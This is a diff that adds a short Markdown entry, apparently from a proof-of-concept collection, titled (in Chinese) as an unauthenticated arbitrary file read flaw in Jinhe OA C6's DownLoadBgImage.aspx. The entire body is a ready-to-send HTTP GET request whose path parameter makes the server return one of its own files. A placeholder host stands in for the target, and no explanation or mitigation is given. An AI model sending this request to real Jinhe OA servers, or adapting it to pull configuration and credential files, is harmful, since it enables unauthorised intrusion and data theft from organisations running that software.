@@ -1,0 +1,8 @@
+# 金和OA C6 DownLoadBgImage 未授权 任意文件读取漏洞
+GET /C6/JHSoft.Web.AddMenu/LoginTemplate/DownLoadBgImage.aspx/?path=/C6/JHSoft.Web.AddMenu/LoginTemplate/DownLoadBgImage.aspx&_ZQA_ID={ZQA_ID} HTTP/1.1
+Host: www.xwd_test.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36
+Accept-Encoding: identity
+Accept: */*
+Connection: keep-alive
+
